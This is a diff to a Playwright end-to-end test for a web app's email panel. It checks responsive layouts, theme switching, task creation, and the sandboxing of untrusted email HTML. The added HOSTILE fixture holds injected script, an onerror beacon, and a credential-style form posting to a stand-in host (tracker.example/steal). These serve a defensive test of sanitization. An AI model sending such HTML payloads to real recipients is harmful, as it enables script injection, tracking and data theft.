@@ -5,7 +5,7 @@
 // gestures. No model call is involved.
 import { mkdirSync } from 'node:fs'
 import { fileURLToPath } from 'node:url'
-import type { Browser, Page } from 'playwright'
+import type { Browser, Page, Request } from 'playwright'
 import { chromium } from 'playwright'
 import { afterAll, beforeAll, describe, expect, it } from 'vitest'
 import { launchWebScaffold, watchConsole, type WebScaffold } from './scaffold.ts'
@@ -16,9 +16,20 @@ const BUNDLE = fileURLToPath(new URL('../../../packages/bundle/faberloom-app/pac
 const SHOTS = fileURLToPath(new URL('../../../docs/scratch/faberloom-daily-work/e1/visual/', import.meta.url))
 const ACTOR = { id: 'e2e@mwt.one', companyId: 'mwt' }
 const SUBJECT = 'OC 4711 Eguisa'
+const SECOND = 'Consulta de precio'
 // The from-zero gesture is a new task each run; a unique title keeps the count
 // honest against the scaffold's persistent store.
 const SCRATCH_TITLE = `Tarea desde cero ${String(Date.now())}`
+
+/** Hostile HTML a third party can send: scripts, a form, tracking and a link. */
+const HOSTILE = [
+  '<p>Hola desde el proveedor</p>',
+  '<script>window.parent.__pwned = true; window.top.location = "https://tracker.example/pwn"</script>',
+  '<img src="https://tracker.example/pixel.png" onerror="window.parent.__pwned = true">',
+  '<form action="https://tracker.example/steal"><input name="dato"><button>Aprobar</button></form>',
+  '<a href="https://tracker.example/x">enlace</a>',
+  '<iframe src="https://tracker.example/frame"></iframe>',
+].join('')
 
 /** The receiver the panel reads: an external service, replaced by a fixture. */
 const inbound = {
@@ -85,8 +96,21 @@ describe('web e2e: Email panel and task entries', () => {
     await page.locator('aside[aria-label="Email"]').waitFor()
   }
 
+  /** The look the panel currently paints, from the preference it stores. */
+  async function currentLook(): Promise<string> {
+    return await page.evaluate(() => window.localStorage.getItem('faberloom.email.look') ?? 'a')
+  }
+
+  /** Switch the surface at a wide viewport, where the control is visible. */
+  async function useLook(target: 'a' | 'b'): Promise<void> {
+    if (await currentLook() === target) return
+    await page.getByRole('button', { name: 'Change look' }).click()
+    await expect.poll(currentLook).toBe(target)
+  }
+
   it('reads beside the list on wide, one pane on narrow, in both looks, and opens tasks once', async () => {
     await page.setViewportSize({ width: 1440, height: 900 })
+    await useLook('a')
     await openMail()
 
     const listBox = await page.getByRole('list', { name: 'Inbox' }).first().boundingBox()
@@ -101,29 +125,41 @@ describe('web e2e: Email panel and task entries', () => {
     await reader.getByRole('heading', { name: SUBJECT }).waitFor()
     await page.screenshot({ path: `${SHOTS}email-wide-look-a.png`, fullPage: false })
 
-    const surface = page.locator('[class*="emailSurface"]').first()
-    const before = await surface.getAttribute('class')
-    await page.getByRole('button', { name: 'Change look' }).click()
-    const after = await surface.getAttribute('class')
-    expect(after).not.toBe(before)
-    await page.screenshot({ path: `${SHOTS}email-wide-look-b.png`, fullPage: false })
-
+    // Narrow, look A: the reader replaces the list, then closing returns to it.
     await page.setViewportSize({ width: 420, height: 800 })
     // Let the viewport resize reach the media query before measuring.
     await page.waitForTimeout(500)
-    await page.getByText('Consulta de precio').waitFor({ state: 'hidden' })
-    const narrowBox = await reader.boundingBox()
-    expect(narrowBox?.width ?? 0).toBeGreaterThan(380)
-    await page.screenshot({ path: `${SHOTS}email-narrow-reader.png`, fullPage: false })
+    await page.getByText(SECOND).waitFor({ state: 'hidden' })
+    expect((await reader.boundingBox())?.width ?? 0).toBeGreaterThan(380)
+    await page.screenshot({ path: `${SHOTS}email-narrow-reader-a.png`, fullPage: false })
     await reader.getByRole('button', { name: 'Close' }).first().click()
-    await page.getByText('Consulta de precio').waitFor({ state: 'visible' })
-    await page.screenshot({ path: `${SHOTS}email-narrow-list.png`, fullPage: false })
-    const pageOverflow = await page.evaluate(() =>
+    await page.getByText(SECOND).waitFor({ state: 'visible' })
+    await page.screenshot({ path: `${SHOTS}email-narrow-list-a.png`, fullPage: false })
+    const overflowA = await page.evaluate(() =>
       document.documentElement.scrollWidth - document.documentElement.clientWidth)
-    expect(pageOverflow).toBeLessThanOrEqual(1)
+    expect(overflowA).toBeLessThanOrEqual(1)
 
-    // From the mail, twice: one task.
+    // Wide again, look B, then narrow in look B.
     await page.setViewportSize({ width: 1440, height: 900 })
+    await openMail()
+    await reader.getByRole('heading', { name: SUBJECT }).waitFor()
+    await useLook('b')
+    await page.screenshot({ path: `${SHOTS}email-wide-look-b.png`, fullPage: false })
+
+    await page.setViewportSize({ width: 420, height: 800 })
+    await page.waitForTimeout(500)
+    await page.getByText(SECOND).waitFor({ state: 'hidden' })
+    await page.screenshot({ path: `${SHOTS}email-narrow-reader-b.png`, fullPage: false })
+    await reader.getByRole('button', { name: 'Close' }).first().click()
+    await page.getByText(SECOND).waitFor({ state: 'visible' })
+    await page.screenshot({ path: `${SHOTS}email-narrow-list-b.png`, fullPage: false })
+    const overflowB = await page.evaluate(() =>
+      document.documentElement.scrollWidth - document.documentElement.clientWidth)
+    expect(overflowB).toBeLessThanOrEqual(1)
+
+    // From the mail, twice: one task. Wide, back on look A.
+    await page.setViewportSize({ width: 1440, height: 900 })
+    await useLook('a')
     await openMail()
     await page.getByRole('button', { name: 'Create task' }).first().click()
     await page.getByText(`Task created: ${SUBJECT}`).waitFor({ state: 'visible' })
@@ -146,5 +182,38 @@ describe('web e2e: Email panel and task entries', () => {
     expect(titles.filter(title => title === SUBJECT)).toHaveLength(1)
     expect(titles.filter(title => title === SCRATCH_TITLE)).toHaveLength(1)
     expect(tripwire.pageErrors).toEqual([])
+  }, 180_000)
+
+  it('isolates hostile HTML in the real browser: no script, no form, no remote request', async () => {
+    const original = inbound.readEmail
+    inbound.readEmail = async () => ({ text: '', html: HOSTILE, attachments: [] })
+    const requests: string[] = []
+    const onRequest = (request: Request): void => { requests.push(request.url()) }
+    page.on('request', onRequest)
+    try {
+      await page.setViewportSize({ width: 1440, height: 900 })
+      await openMail()
+      // The second message has not been read in this run, so the body is fetched
+      // with the hostile fixture instead of a cached text body.
+      await page.getByText(SECOND, { exact: false }).first().click()
+      const frame = page.frameLocator('iframe[title="Body"]')
+      await frame.getByText('Hola desde el proveedor').waitFor()
+      const iframe = page.locator('iframe[title="Body"]')
+      const srcdoc = (await iframe.getAttribute('srcdoc')) ?? ''
+      expect(srcdoc).toContain('Content-Security-Policy')
+      expect(srcdoc).not.toContain('<script')
+      expect(srcdoc).not.toContain('<form')
+      expect(srcdoc).not.toContain('tracker.example')
+      expect(await iframe.getAttribute('sandbox')).toBe('')
+      // Nothing from the hostile origin reached the network, and nothing ran.
+      await page.waitForTimeout(600)
+      expect(requests.filter(url => url.includes('tracker.example'))).toEqual([])
+      expect(await page.evaluate(() => (window as { __pwned?: boolean }).__pwned ?? null)).toBeNull()
+      expect(await page.locator('article form').count()).toBe(0)
+      await page.screenshot({ path: `${SHOTS}email-hostile.png`, fullPage: false })
+    } finally {
+      inbound.readEmail = original
+      page.off('request', onRequest)
+    }
   }, 120_000)
 })
